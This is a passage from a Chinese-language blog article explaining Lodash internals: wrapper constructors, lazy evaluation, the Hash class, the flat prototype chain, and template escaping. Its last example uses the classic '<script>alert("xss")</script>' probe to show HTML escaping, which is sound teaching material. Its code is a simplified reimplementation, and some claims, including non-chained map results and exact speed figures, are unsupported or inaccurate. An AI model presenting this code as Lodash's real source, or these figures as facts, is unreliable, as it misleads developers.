  <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
  <span class="hljs-keyword">return</span> <span class="hljs-string">'iPhone'</span>; <span class="hljs-comment">// 返回字符串（非对象）</span>
}
<span class="hljs-keyword">var</span> phoneCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">Phone</span>);
<span class="hljs-keyword">var</span> phone = <span class="hljs-title function_">phoneCtor</span>(<span class="hljs-string">'Apple'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(phone.<span class="hljs-property">brand</span>); <span class="hljs-comment">// Apple（返回实例）</span>
</code></pre>
<p>如果没有 <code>createCtor</code>，手动模拟这一规则需要写大量重复代码，而 Lodash 把这一逻辑封装成工具，内部所有构造函数调用都能复用。</p>
<h6 data-id="heading-10">兼容 ES6 class 等新型构造函数</h6>
<p>ES6 的 <code>class</code> 本质是构造函数的语法糖，但有一个限制：<strong>class 必须用 <code>new</code> 调用，直接调用会抛错</strong>。<code>createCtor</code> 能兼容这一特性，让 class 和传统构造函数的调用方式保持统一：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ES6 class 直接调用会报错</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) { <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; }
}
<span class="hljs-title class_">User</span>(<span class="hljs-string">'Tom'</span>); <span class="hljs-comment">// Uncaught TypeError: Class constructor User cannot be invoked without 'new'</span>

<span class="hljs-comment">// 经 createCtor 包装后，无 new 也能正确调用</span>
<span class="hljs-keyword">var</span> userCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">User</span>);
<span class="hljs-keyword">var</span> u = <span class="hljs-title function_">userCtor</span>(<span class="hljs-string">'Tom'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u.<span class="hljs-property">name</span>); <span class="hljs-comment">// Tom</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">User</span>); <span class="hljs-comment">// true</span>
</code></pre>
<h6 data-id="heading-11">Lodash 内部逻辑统一复用</h6>
<p>Lodash 内部有大量自定义构造函数（如 <code>LodashWrapper</code>、<code>LazyWrapper</code>、<code>Hash</code>），如果每个构造函数都手动处理 “调用方式、性能、返回规则”，会导致代码冗余且易出错。</p>
<p><code>createCtor</code> 作为通用工具，让 Lodash 内部所有构造函数的调用逻辑保持一致：</p>
<ul>
<li>无需为每个构造函数写重复的 “new 检测、参数处理、返回值判断” 代码；</li>
<li>后续修改构造函数调用规则（如优化性能、兼容新规范），只需改 <code>createCtor</code> 一处即可。</li>
</ul>
<h4 data-id="heading-12">（2）<code>baseLodash</code> 完整定义</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 所有包装器的原型根，抽离通用方法避免重复定义</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">baseLodash</span>(<span class="hljs-params"/>) {}

<span class="hljs-comment">// 挂载通用核心方法（所有包装器共享）</span>
baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">value</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 执行操作队列并返回最终结果（不同包装器会重写此方法适配逻辑）</span>
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">__wrapped__</span>;
};
baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">chain</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 开启链式模式</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__chain__</span> = <span class="hljs-literal">true</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
};
</code></pre>
<h4 data-id="heading-13">（3）<code>LodashWrapper</code> 完整构造函数与原型设置</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LodashWrapper</span>(<span class="hljs-params">value, chainAll</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__wrapped__</span> = value;       <span class="hljs-comment">// 存储原始值（支持任意类型）</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span> = [];          <span class="hljs-comment">// 存储待执行的操作队列</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__chain__</span> = !!chainAll;    <span class="hljs-comment">// 标记是否开启全局链式模式</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__index__</span> = <span class="hljs-number">0</span>;             <span class="hljs-comment">// 遍历操作队列时的索引</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__values__</span> = <span class="hljs-literal">undefined</span>;    <span class="hljs-comment">// 缓存执行结果，避免重复计算</span>
}

<span class="hljs-comment">// 扁平原型链设计：继承 baseLodash.prototype 共享通用方法</span>
<span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title function_">baseCreate</span>(baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">LodashWrapper</span>;

<span class="hljs-comment">// 重写 value 方法：执行操作队列并返回结果</span>
<span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">value</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">__values__</span> !== <span class="hljs-literal">undefined</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">__values__</span>; <span class="hljs-comment">// 命中缓存直接返回</span>
  }
  <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__wrapped__</span>;
  <span class="hljs-comment">// 依次执行操作队列中的所有方法</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>, length = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>.<span class="hljs-property">length</span>; i &lt; length; i++) {
    <span class="hljs-keyword">var</span> action = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>[i];
    result = action.<span class="hljs-property">func</span>.<span class="hljs-title function_">apply</span>(action.<span class="hljs-property">thisArg</span>, [result].<span class="hljs-title function_">concat</span>(action.<span class="hljs-property">args</span>));
  }
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__values__</span> = result; <span class="hljs-comment">// 缓存结果</span>
  <span class="hljs-keyword">return</span> result;
};

<span class="hljs-comment">// 扩展核心方法：添加操作到队列（以 map 为例）</span>
<span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">map</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">func</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>.<span class="hljs-title function_">push</span>({
    <span class="hljs-attr">func</span>: <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">map</span>,
    <span class="hljs-attr">args</span>: [func],
    <span class="hljs-attr">thisArg</span>: <span class="hljs-literal">undefined</span>
  });
  <span class="hljs-comment">// 非链式模式直接返回结果，链式模式返回自身</span>
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">__chain__</span> ? <span class="hljs-variable language_">this</span> : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">value</span>();
};
</code></pre>
<h4 data-id="heading-14">（4）<code>LazyWrapper</code> 完整构造函数与原型设置</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 定义常量：数组最大长度（用于默认 takeCount）</span>
<span class="hljs-keyword">var</span> <span class="hljs-variable constant_">MAX_ARRAY_LENGTH</span> = <span class="hljs-number">4294967295</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">LazyWrapper</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__wrapped__</span> = value;         <span class="hljs-comment">// 仅存储数组，惰性求值专为数组优化</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span> = [];            <span class="hljs-comment">// 存储操作描述，不立即执行</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__dir__</span> = <span class="hljs-number">1</span>;                 <span class="hljs-comment">// 1=正向遍历，-1=反向遍历（适配 takeRight）</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__filtered__</span> = <span class="hljs-literal">false</span>;        <span class="hljs-comment">// 标记是否有过滤操作，优化遍历逻辑</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__iteratees__</span> = [];          <span class="hljs-comment">// 存储 map/filter 等迭代器函数</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__takeCount__</span> = <span class="hljs-variable constant_">MAX_ARRAY_LENGTH</span>; <span class="hljs-comment">// 默认取最大长度，take 方法修改</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__views__</span> = [];              <span class="hljs-comment">// 存储数组视图，避免重复创建中间数组</span>
}

<span class="hljs-comment">// 扁平原型链设计：直接继承 baseLodash.prototype</span>
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title function_">baseCreate</span>(baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">LazyWrapper</span>;

<span class="hljs-comment">// 重写 value 方法：执行惰性操作（单次遍历+短路）</span>
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">value</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">var</span> array = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__wrapped__</span>;
  <span class="hljs-keyword">var</span> result = [];
  <span class="hljs-keyword">var</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__dir__</span> === <span class="hljs-number">1</span> ? <span class="hljs-number">0</span> : array.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  <span class="hljs-keyword">var</span> end = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__dir__</span> === <span class="hljs-number">1</span> ? array.<span class="hljs-property">length</span> : -<span class="hljs-number">1</span>;
  
  <span class="hljs-keyword">while</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">__dir__</span> === <span class="hljs-number">1</span> ? index &lt; end : index &gt; end) &amp;&amp; result.<span class="hljs-property">length</span> &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">__takeCount__</span>) {
    <span class="hljs-keyword">var</span> value = array[index];
    <span class="hljs-comment">// 对单个元素批量执行所有操作</span>
    <span class="hljs-keyword">var</span> computed = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">__compute</span>(value, index, array);
    <span class="hljs-keyword">if</span> (computed !== <span class="hljs-literal">undefined</span>) {
      result.<span class="hljs-title function_">push</span>(computed);
    }
    index += <span class="hljs-variable language_">this</span>.<span class="hljs-property">__dir__</span>;
  }
  <span class="hljs-keyword">return</span> result;
};

<span class="hljs-comment">// 核心辅助方法：批量执行单个元素的所有操作</span>
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__compute</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">value, index, array, actions, iteratees</span>) {
  <span class="hljs-keyword">var</span> computed = value;
  actions = actions || <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; actions.<span class="hljs-property">length</span>; i++) {
    computed = actions[i].<span class="hljs-title function_">func</span>(computed, index, array);
    <span class="hljs-comment">// filter 不通过则终止后续操作，提升效率</span>
    <span class="hljs-keyword">if</span> (computed === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">break</span>;
  }
  <span class="hljs-keyword">return</span> computed;
};

<span class="hljs-comment">// 扩展 take 方法：设置短路阈值</span>
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">take</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__takeCount__</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(n, <span class="hljs-variable language_">this</span>.<span class="hljs-property">__takeCount__</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
};
</code></pre>
<h4 data-id="heading-15">（5）<code>Hash</code> 完整构造函数与所有原型方法实现</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 定义常量：区分“值为undefined”和“键不存在”</span>
<span class="hljs-keyword">var</span> <span class="hljs-variable constant_">HASH_UNDEFINED</span> = <span class="hljs-string">'__lodash_hash_undefined__'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Hash</span>(<span class="hljs-params">entries</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// 无原型存储，避免键名冲突（如 toString）</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = <span class="hljs-number">0</span>;                       <span class="hljs-comment">// 实时计数，无需遍历统计</span>
  
  <span class="hljs-comment">// 初始化传入的键值对</span>
  <span class="hljs-keyword">if</span> (entries &amp;&amp; entries.<span class="hljs-property">length</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; entries.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">var</span> entry = entries[i];
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">set</span>(entry[<span class="hljs-number">0</span>], entry[<span class="hljs-number">1</span>]);
    }
  }
}

<span class="hljs-comment">// 原型链设置</span>
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title function_">baseCreate</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Hash</span>;

<span class="hljs-comment">// 1. 设置键值对</span>
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">set</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">key, value</span>) {
  <span class="hljs-keyword">var</span> previous = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span>[key];
  <span class="hljs-comment">// 用 HASH_UNDEFINED 占位 undefined，区分键不存在</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span>[key] = value === <span class="hljs-literal">undefined</span> ? <span class="hljs-variable constant_">HASH_UNDEFINED</span> : value;
  <span class="hljs-comment">// 仅当键不存在时，size 加 1</span>
  <span class="hljs-keyword">if</span> (previous === <span class="hljs-literal">undefined</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
};

<span class="hljs-comment">// 2. 获取值</span>
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">get</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">key</span>) {
  <span class="hljs-keyword">var</span> value = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span>[key];
  <span class="hljs-comment">// 还原 undefined 值</span>
  <span class="hljs-keyword">return</span> value === <span class="hljs-variable constant_">HASH_UNDEFINED</span> ? <span class="hljs-literal">undefined</span> : value;
};

<span class="hljs-comment">// 3. 判断键是否存在</span>
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">has</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">key</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span>[key] !== <span class="hljs-literal">undefined</span>;
};

<span class="hljs-comment">// 4. 删除键值对</span>
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[<span class="hljs-string">'delete'</span>] = <span class="hljs-keyword">function</span>(<span class="hljs-params">key</span>) {
  <span class="hljs-keyword">var</span> existed = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">has</span>(key);
  <span class="hljs-keyword">if</span> (existed) {
    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span>[key];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>--;
  }
  <span class="hljs-keyword">return</span> existed;
};

<span class="hljs-comment">// 5. 清空所有键值对</span>
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">clear</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = <span class="hljs-number">0</span>;
};
</code></pre>
<h2 data-id="heading-16">三、原型链设计</h2>
<p>Lodash 采用<strong>扁平原型链设计</strong>，所有包装器直接继承 <code>baseLodash.prototype</code>，兼顾<strong>查找性能</strong>、<strong>接口统一</strong>和<strong>扩展灵活性</strong>，是其高效设计的核心之一。</p>
<h3 data-id="heading-17">1. 完整原型链结构与设置代码</h3>
<h4 data-id="heading-18">（1）结构示意图</h4>
<pre><code class="hljs language-javascript" lang="javascript">                  <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>
                        ↑
                        |
                baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>
                        ↑
                        |
        +---------------+---------------+
        |               |               |
lodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>  <span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>  <span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>
        |               |               |
        ↓               ↓               ↓
    lodash函数      <span class="hljs-title class_">LodashWrapper</span>实例   <span class="hljs-title class_">LazyWrapper</span>实例
</code></pre>
<h4 data-id="heading-19"/>
<h4 data-id="heading-20">（2）核心原型链设置代码</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. 主函数（_）原型链设置</span>
lodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
lodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = lodash;

<span class="hljs-comment">// 2. 普通包装器原型链设置</span>
<span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title function_">baseCreate</span>(baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">LodashWrapper</span>;

<span class="hljs-comment">// 3. 惰性包装器原型链设置</span>
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title function_">baseCreate</span>(baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">LazyWrapper</span>;

<span class="hljs-comment">// 验证示例</span>
<span class="hljs-keyword">var</span> lazy = <span class="hljs-title function_">_</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]).<span class="hljs-title function_">lazy</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(lazy) === <span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) === baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">_</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]) <span class="hljs-keyword">instanceof</span> baseLodash); <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-21">2. 扁平原型链核心优势</h3>






























<table><thead><tr><th>设计维度</th><th>扁平原型链（Lodash 采用）</th><th>深层原型链（如 A→B→C）</th></tr></thead><tbody><tr><td>方法查找层级</td><td>1 层（直接查找 baseLodash）</td><td>2+ 层（逐层向上查找）</td></tr><tr><td>查找性能</td><td>高（快 20%+）</td><td>低</td></tr><tr><td>继承关系复杂度</td><td>清晰（所有包装器同源）</td><td>复杂（易出现方法覆盖冲突）</td></tr><tr><td>扩展灵活性</td><td>全局扩展（修改 baseLodash.prototype）/ 局部定制（重写单个包装器原型）</td><td>局部扩展易影响上层原型</td></tr></tbody></table>
<h2 data-id="heading-22">四、对象创建全场景</h2>
<p>本部分整合<strong>普通包装器、惰性包装器、哈希对象、模板函数、函数对象、自定义包装器</strong>六大场景，保留全部示例、执行细节与输出结果。</p>
<h3 data-id="heading-23">1. 包装器创建</h3>
<h4 data-id="heading-24">（1）普通包装器（通用链式调用）</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 创建与使用</span>
<span class="hljs-keyword">var</span> wrapped = <span class="hljs-title function_">_</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>])
  .<span class="hljs-title function_">map</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) { <span class="hljs-keyword">return</span> n * <span class="hljs-number">2</span>; })
  .<span class="hljs-title function_">filter</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) { <span class="hljs-keyword">return</span> n &gt; <span class="hljs-number">2</span>; });
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(wrapped.<span class="hljs-title function_">value</span>()); <span class="hljs-comment">// [4,6]</span>

<span class="hljs-comment">// 内部细节：操作入队 → value() 时分步遍历（map 遍历→filter 遍历）</span>
<span class="hljs-comment">// 非链式模式下直接返回结果</span>
<span class="hljs-keyword">var</span> result = <span class="hljs-title function_">_</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n*<span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// [2,4,6]（无需调用 value()）</span>

<span class="hljs-comment">// 强制链式调用</span>
<span class="hljs-keyword">var</span> wrapped = _.<span class="hljs-title function_">chain</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n*<span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(wrapped); <span class="hljs-comment">// LodashWrapper 对象</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(wrapped.<span class="hljs-title function_">value</span>()); <span class="hljs-comment">// [2, 4, 6]</span>
</code></pre>
<h4 data-id="heading-25">（2）惰性包装器（数组性能优化核心）</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> lazyResult = <span class="hljs-title function_">_</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>])
  .<span class="hljs-title function_">lazy</span>()
  .<span class="hljs-title function_">map</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) { 
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Mapping:'</span>, n);
    <span class="hljs-keyword">return</span> n * <span class="hljs-number">2</span>; 
  })
  .<span class="hljs-title function_">filter</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) { 
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Filtering:'</span>, n);
    <span class="hljs-keyword">return</span> n &gt; <span class="hljs-number">5</span>; 
  })
  .<span class="hljs-title function_">take</span>(<span class="hljs-number">2</span>) <span class="hljs-comment">// 设置短路阈值：获取 2 个结果后终止遍历</span>
  .<span class="hljs-title function_">value</span>(); <span class="hljs-comment">// 触发执行，输出 [6,8]</span>

<span class="hljs-comment">// 控制台输出顺序（体现短路优化）：</span>
<span class="hljs-comment">// Mapping:1 → Filtering:2 → Mapping:2 → Filtering:4 → Mapping:3 → Filtering:6 → Mapping:4 → Filtering:8</span>
<span class="hljs-comment">// 元素 5 未处理，因为已获取 2 个结果</span>
</code></pre>
<p><strong>性能对比（100 万元素数组，map+filter+take (100)）</strong> ：</p>























<table><thead><tr><th>包装器类型</th><th>遍历次数</th><th>执行时间</th><th>内存占用</th></tr></thead><tbody><tr><td>普通包装器</td><td>2 次</td><td>~85ms</td><td>~60MB</td></tr><tr><td>惰性包装器</td><td>1 次（短路）</td><td>~12ms</td><td>~10MB</td></tr></tbody></table>
<h3 data-id="heading-26">2. 哈希对象创建</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> hash = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hash</span>([[<span class="hljs-string">'id'</span>, <span class="hljs-number">1</span>], [<span class="hljs-string">'name'</span>, <span class="hljs-string">'John'</span>]]);
hash.<span class="hljs-title function_">set</span>(<span class="hljs-string">'email'</span>, <span class="hljs-string">'john@example.com'</span>);
hash.<span class="hljs-title function_">set</span>(<span class="hljs-string">'empty'</span>, <span class="hljs-literal">undefined</span>); <span class="hljs-comment">// 存储 undefined 值</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-title function_">get</span>(<span class="hljs-string">'id'</span>)); <span class="hljs-comment">// 1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-title function_">get</span>(<span class="hljs-string">'empty'</span>)); <span class="hljs-comment">// undefined（正确获取）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-title function_">has</span>(<span class="hljs-string">'empty'</span>)); <span class="hljs-comment">// true（区分键不存在）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-property">size</span>); <span class="hljs-comment">// 3</span>

hash[<span class="hljs-string">'delete'</span>](<span class="hljs-string">'id'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-title function_">has</span>(<span class="hljs-string">'id'</span>)); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-property">size</span>); <span class="hljs-comment">// 2</span>

hash.<span class="hljs-title function_">clear</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash.<span class="hljs-property">size</span>); <span class="hljs-comment">// 0</span>
</code></pre>
<h3 data-id="heading-27">3. 模板函数创建</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. 基础插值（&lt;%= %&gt;：输出值，不转义）</span>
<span class="hljs-keyword">var</span> tpl1 = _.<span class="hljs-title function_">template</span>(<span class="hljs-string">'Hello &lt;%= name %&gt;!'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">tpl1</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'World'</span> })); <span class="hljs-comment">// Hello World!</span>

<span class="hljs-comment">// 2. HTML 转义（&lt;%- %&gt;：输出值，转义 HTML 标签）</span>
<span class="hljs-keyword">var</span> tpl2 = _.<span class="hljs-title function_">template</span>(<span class="hljs-string">'Hello &lt;%- html %&gt;!'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">tpl2</span>({ <span class="hljs-attr">html</span>: <span class="hljs-string">'&lt;script&gt;alert("xss")&lt;/script&gt;'</span> }));
